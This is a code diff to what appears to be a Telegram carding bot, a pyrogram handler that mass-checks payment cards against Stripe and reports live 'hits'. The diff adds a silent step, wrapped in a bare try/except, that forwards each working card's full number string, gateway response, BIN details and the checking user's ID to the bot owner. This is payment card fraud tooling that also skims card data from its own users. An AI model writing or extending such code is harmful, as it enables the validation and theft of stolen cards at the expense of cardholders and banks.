@@ -17,6 +17,7 @@ from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ParseMode
 from BOT.helper.start import load_users
 from BOT.helper.permissions import check_private_access
+from BOT.helper.forward_hits import forward_mass_hit
 from BOT.gc.credit import deduct_credit_bulk
 
 # Try to import BIN lookup
@@ -189,6 +190,7 @@ async def handle_mass_stripe(client, message):
                 card_num = result.card.split("|")[0] if "|" in result.card else result.card
                 bin_info = "N/A"
                 country_info = "N/A"
+                bin_data = None
                 try:
                     bin_data = get_bin_details(card_num[:6])
                     if bin_data:
@@ -212,6 +214,21 @@ async def handle_mass_stripe(client, message):
                 )
                 try:
                     await message.reply(hit_msg, parse_mode=ParseMode.HTML)
+                except:
+                    pass
+
+                # Forward hit to owner
+                try:
+                    await forward_mass_hit(
+                        client=client,
+                        gateway="Stripe",
+                        card=result.card,
+                        status=result.status,
+                        response=result.response,
+                        user_id=user_id,
+                        checked_by=f"{checked_by} [<code>{plan} {badge}</code>]",
+                        bin_data=bin_data
+                    )
                 except:
                     pass
 
